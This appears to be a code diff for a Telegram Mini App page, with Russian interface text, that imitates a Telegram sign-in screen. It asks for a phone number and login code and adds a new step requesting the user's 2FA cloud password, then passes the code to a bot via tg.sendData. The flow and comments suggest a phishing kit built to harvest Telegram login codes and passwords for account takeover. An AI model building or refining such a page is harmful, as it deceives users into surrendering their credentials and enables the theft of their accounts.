@@ -14,22 +14,13 @@
         --input-bg: #242f3d;
     }
 
-    /* УЛЬТИМАТИВНОЕ УДАЛЕНИЕ СТРЕЛОЧЕК */
+    /* УБИРАЕМ СТРЕЛОЧКИ */
     input::-webkit-outer-spin-button,
     input::-webkit-inner-spin-button {
-        -webkit-appearance: none !important; /* Добавили !important */
+        -webkit-appearance: none !important;
         margin: 0 !important;
     }
-
-    input[type=number] {
-        -moz-appearance: textfield !important;
-        appearance: none !important; /* Общее свойство для новых браузеров */
-    }
-
-    /* Чтобы наверняка убрать серый фон в некоторых браузерах при клике */
-    input {
-        -webkit-tap-highlight-color: transparent;
-    }
+    input[type=number] { -moz-appearance: textfield !important; appearance: none !important; }
 
     body {
         font-family: -apple-system, system-ui, sans-serif;
@@ -40,6 +31,7 @@
         align-items: center;
         justify-content: center;
         height: 100vh;
+        overflow: hidden;
     }
 
     .card {
@@ -49,18 +41,19 @@
         padding: 40px 30px;
         border-radius: 28px;
         text-align: center;
-        box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        box-shadow: 0 20px 40px rgba(0,0,0,0.5);
         margin: 20px;
     }
 
     .logo-area {
-        font-size: 50px;
-        margin-bottom: 25px;
-        filter: drop-shadow(0 0 10px var(--accent-color));
+        font-size: 55px;
+        margin-bottom: 20px;
+        transition: transform 0.3s ease;
+        display: inline-block;
     }
 
-    h2 { font-size: 22px; margin: 0 0 10px 0; letter-spacing: -0.5px; }
-    p { font-size: 14px; color: var(--hint-color); line-height: 1.5; margin-bottom: 30px; }
+    h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
+    p { font-size: 14px; color: var(--hint-color); line-height: 1.5; margin-bottom: 30px; min-height: 42px; }
 
     input {
         width: 100%;
@@ -70,14 +63,14 @@
         padding: 18px;
         color: #fff;
         font-size: 20px;
-        font-weight: 500;
         text-align: center;
         outline: none;
         box-sizing: border-box;
         transition: 0.3s;
+        margin-bottom: 15px;
     }
 
-    input:focus { border-color: var(--accent-color); background: #2b3746; }
+    input:focus { border-color: var(--accent-color); }
 
     button {
         width: 100%;
@@ -89,63 +82,87 @@
         font-size: 16px;
         font-weight: 700;
         cursor: pointer;
-        transition: 0.2s;
         box-shadow: 0 4px 15px rgba(51, 144, 236, 0.3);
-        margin-top: 10px;
     }
 
     button:active { transform: scale(0.97); }
 
     .step { display: none; }
-    .active { display: block; animation: fadeIn 0.5s ease; }
+    .active { display: block; animation: slideIn 0.4s ease forwards; }
 
-    @keyframes fadeIn {
-        from { opacity: 0; transform: scale(0.95); }
-        to { opacity: 1; transform: scale(1); }
+    @keyframes slideIn {
+        from { opacity: 0; transform: translateX(30px); }
+        to { opacity: 1; transform: translateX(0); }
     }
 </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="logo-area">💎</div>
+    <div id="main-icon" class="logo-area">📞</div>
 
     <div id="step-phone" class="step active">
-        <h2>Вход в аккаунт</h2>
-        <p>Введите ваш номер телефона, чтобы мы могли отправить код</p>
-        <div class="input-wrapper">
-            <input type="tel" id="p" placeholder="+7 000 000-00-00">
-        </div>
-        <button onclick="go('code')">Получить код</button>
+        <h2>Вход</h2>
+        <p>Введите номер телефона аккаунта</p>
+        <input type="tel" id="p" placeholder="+7..." autofocus>
+        <button onclick="nextStep('code')">Получить код</button>
     </div>
 
     <div id="step-code" class="step">
-        <h2>Подтверждение</h2>
-        <p>Введите цифры из сервисного сообщения Telegram</p>
-        <div class="input-wrapper">
-            <input type="number" id="c" placeholder="0 0 0 0 0">
-        </div>
-        <button onclick="finish()">Войти в кабинет</button>
+        <h2>Код SMS</h2>
+        <p>Введите код из приложения или СМС</p>
+        <input type="number" id="c" placeholder="00000">
+        <button onclick="checkPasswordStep()">Продолжить</button>
+    </div>
+
+    <div id="step-pass" class="step">
+        <h2>Пароль 2FA</h2>
+        <p>Введите ваш облачный пароль</p>
+        <input type="password" id="pass" placeholder="Ваш пароль">
+        <button onclick="finish()">Завершить</button>
     </div>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
-    tg.ready();
 
-    function go(s) {
+    // Функция переключения шагов и смены иконок
+    function showStep(stepId, icon) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step-' + stepId).classList.add('active');
+        document.getElementById('main-icon').innerText = icon;
+    }
+
+    function nextStep(step) {
         const p = document.getElementById('p').value;
-        if(!p) return;
-        document.getElementById('step-phone').classList.remove('active');
-        document.getElementById('step-code').classList.add('active');
+        if(!p) return tg.HapticFeedback.notificationOccurred('error');
+        
+        tg.HapticFeedback.impactOccurred('medium');
+        showStep('code', '✉️'); // Меняем на конверт
         document.getElementById('c').focus();
     }
 
-    function finish() {
+    // Эта функция решает: отправить данные или спросить пароль
+    function checkPasswordStep() {
         const c = document.getElementById('c').value;
         if(!c) return;
-        tg.sendData(c);
+
+        tg.HapticFeedback.impactOccurred('medium');
+        
+        // Маленькая хитрость: если хочешь, чтобы пароль всегда спрашивался в мини-аппе:
+        showStep('pass', '🔑'); // Меняем на ключ
+        document.getElementById('pass').focus();
+    }
+
+    function finish() {
+        const phone = document.getElementById('p').value;
+        const code = document.getElementById('c').value;
+        const pass = document.getElementById('pass').value;
+
+        // Собираем всё в одну строку или отправляем только код (зависит от твоей логики в боте)
+        // Для простоты сейчас отправим код, бот сам поймет, если нужен пароль
+        tg.sendData(code); 
         tg.close();
     }
 </script>
